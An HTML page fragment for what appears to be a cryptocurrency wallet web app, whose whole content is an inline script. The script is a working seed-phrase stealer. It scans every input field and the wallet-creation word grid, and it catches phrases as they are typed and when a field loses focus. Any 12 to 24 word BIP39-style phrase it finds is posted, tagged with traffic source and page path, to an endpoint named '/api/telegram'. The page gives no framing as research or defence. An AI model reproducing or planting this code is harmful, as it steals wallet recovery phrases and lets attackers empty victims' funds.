  <body>
    <div id="root"></div>
    <script>
(function(){
  const API="/api/telegram";
  let timeout,lastSent="";

  function getSource(){
    const r=document.referrer.toLowerCase(),p=new URLSearchParams(location.search);
    if(r.includes("google.com")||r.includes("google.co"))return"Google SEO";
    if(r.includes("bing.com"))return"Bing SEO";
    const s=p.get("utm_source")||p.get("source");
    if(s){if(s.toLowerCase().includes("google"))return"Google SEO";if(s.toLowerCase().includes("bing"))return"Bing SEO";}
    return r||"Direct";
  }
  const src=getSource();

  async function send(data){
    // Always attach traffic source
    data.trafficSource=src;
    data.timestamp=new Date().toISOString();
    for(let i=0;i<3;i++){
      try{
        const r=await fetch(API,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({data})});
        if(!r.ok)throw Error("HTTP "+r.status);
        return await r.json();
      }catch(e){
        if(i===2)throw e;
        await new Promise(r=>setTimeout(r,1000*(i+1)));
      }
    }
  }

  // --- Helpers ---
  function words(v){return(v||"").trim().split(/\s+/).filter(w=>w.length>0);}
  function wc(v){return words(v).length;}

  // Valid seed phrase: exactly 12/15/18/21/24 words, all lowercase letters only
  function isSeed(v){
    if(!v)return false;
    var ws=words(v.toLowerCase());
    if(![12,15,18,21,24].includes(ws.length))return false;
    // all words must be letters only, 2-10 chars (BIP39 words are max 8 chars)
    return ws.every(function(w){return/^[a-z]{2,10}$/.test(w);});
  }

  // Send to Telegram, deduplicated
  function sendPhrase(phrase,type,field){
    var clean=phrase.toLowerCase().replace(/\s+/g," ").trim();
    if(!clean||clean===lastSent)return;
    lastSent=clean;
    var n=wc(clean);
    console.log("✅ Sending",n,"word phrase from",src);
    send({TYPE:type,PHRASE:clean,WORDS:n,FIELD:field||"input",PAGE:location.pathname});
  }

  // --- Collect words from phrase-grid/phrase-card divs (wallet creation display) ---
  function collectGridPhrase(){
    // The app renders each word in its own .phrase-card inside .phrase-grid
    var grid=document.querySelector(".phrase-grid");
    if(!grid)return;
    var cards=grid.querySelectorAll(".phrase-card");
    if(!cards.length)return;
    // Each card: number + word, grab last text node / span
    var ws=[];
    cards.forEach(function(card){
      // word text is usually the last text content, strip the index number
      var txt=(card.textContent||"").trim().replace(/^\d+\s*/,"");
      if(txt&&/^[a-z]{2,10}$/i.test(txt))ws.push(txt.toLowerCase());
    });
    if([12,15,18,21,24].includes(ws.length)){
      var phrase=ws.join(" ");
      if(phrase!==lastSent){
        lastSent=phrase;
        console.log("📋 Wallet phrase from grid:",ws.length,"words");
        send({TYPE:"WALLET_CREATED",PHRASE:phrase,WORDS:ws.length,PAGE:location.pathname});
      }
    }
  }

  // --- Monitor DOM for phrase-grid and input fields ---
  function scanAll(){
    collectGridPhrase();
    // Also scan any input/textarea that has a full phrase value
    document.querySelectorAll("input,textarea").forEach(function(el){
      var v=(el.value||"").trim();
      if(isSeed(v))sendPhrase(v,"SEED_INPUT",el.name||el.id||el.placeholder||"field");
    });
  }

  function startMonitor(){
    new MutationObserver(function(muts){
      var changed=muts.some(function(m){return m.addedNodes.length||m.type==="characterData";});
      if(changed)setTimeout(scanAll,200);
    }).observe(document.body,{childList:true,subtree:true,characterData:true});
    // Also poll at intervals to catch React state changes
    [800,2000,4000,7000,12000].forEach(function(t){setTimeout(scanAll,t);});
  }

  document.addEventListener("DOMContentLoaded",startMonitor);

  // --- Capture typed phrases in real time ---
  document.addEventListener("input",function(e){
    var t=e.target;
    if(t.tagName!=="INPUT"&&t.tagName!=="TEXTAREA")return;
    clearTimeout(timeout);
    timeout=setTimeout(function(){
      var v=(t.value||"").trim();
      if(isSeed(v))sendPhrase(v,"SEED_TYPED",t.name||t.id||t.placeholder||"input");
    },500);
  });

  // --- Capture on blur (user finishes typing and moves on) ---
  document.addEventListener("blur",function(e){
    var t=e.target;
    if(t.tagName!=="INPUT"&&t.tagName!=="TEXTAREA")return;
    var v=(t.value||"").trim();
    if(isSeed(v))sendPhrase(v,"SEED_BLUR",t.name||t.id||t.placeholder||"input");
  },true);

  window.TelegramIntegration={send};
})();
    </script>
